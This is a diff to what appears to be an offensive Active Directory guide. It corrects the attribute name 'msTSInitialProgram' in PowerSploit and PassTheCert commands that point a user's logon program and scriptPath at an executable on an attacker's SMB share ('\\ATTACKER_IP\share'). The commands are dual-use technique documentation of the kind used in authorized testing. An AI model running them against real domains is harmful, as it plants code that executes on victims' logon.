@@ -33,7 +33,7 @@ This can be achieved with [Set-DomainObject](https://powersploit.readthedocs.io/
 
 ```bash
 
-Set-DomainObject testuser -Set @{'msTSTnitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
+Set-DomainObject testuser -Set @{'msTSInitialProgram'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
 
 Set-DomainObject testuser -Set @{'scriptPath'='\\ATTACKER_IP\share\run_at_logon.exe'} -Verbose
 ```
@@ -50,8 +50,8 @@ $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP'
 # List all the available actions
 Invoke-PassTheCert -a -NoBanner
 
-# Overwrite the 'msTSTnitialProgram' and 'scriptPath' attributes's values of 'John JD. DOE' user to '\\ATTACKER_IP\share\run_at_logon.exe'
-Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'msTSTnitialProgram' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
+# Overwrite the 'msTSInitialProgram' and 'scriptPath' attributes's values of 'John JD. DOE' user to '\\ATTACKER_IP\share\run_at_logon.exe'
+Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'msTSInitialProgram' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
 Invoke-PassTheCert -Action 'OverwriteValueInAttribute' -LdapConnection $LdapConnection -Object 'CN=John JD. DOE,CN=Users,DC=X' -Attribute 'scriptPath' -Value '\\ATTACKER_IP\share\run_at_logon.exe'
 ```
 
